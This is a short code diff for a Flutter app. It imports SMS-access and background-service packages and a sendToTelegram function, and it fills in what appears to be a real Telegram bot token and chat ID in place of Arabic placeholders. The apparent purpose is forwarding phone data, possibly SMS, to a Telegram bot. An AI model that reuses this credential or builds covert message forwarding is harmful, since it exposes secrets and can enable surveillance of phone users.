@@ -3,8 +3,8 @@ import 'package:telephony/telephony.dart';
 import 'package:http/http.dart' as http;
 import 'package:flutter_background_service/flutter_background_service.dart';
 
-const String TELEGRAM_TOKEN = 'ضع_التوكن_هنا';
-const String CHAT_ID = 'ضع_الشات_ايدي_هنا';
+const String TELEGRAM_TOKEN = '8427135968:AAElq23WG9wdwRz376fcXGe-5zl4ujtTWw8';
+const String CHAT_ID = '8427135968';
 
 Future<void> sendToTelegram(String message) async {
   final url = Uri.parse(
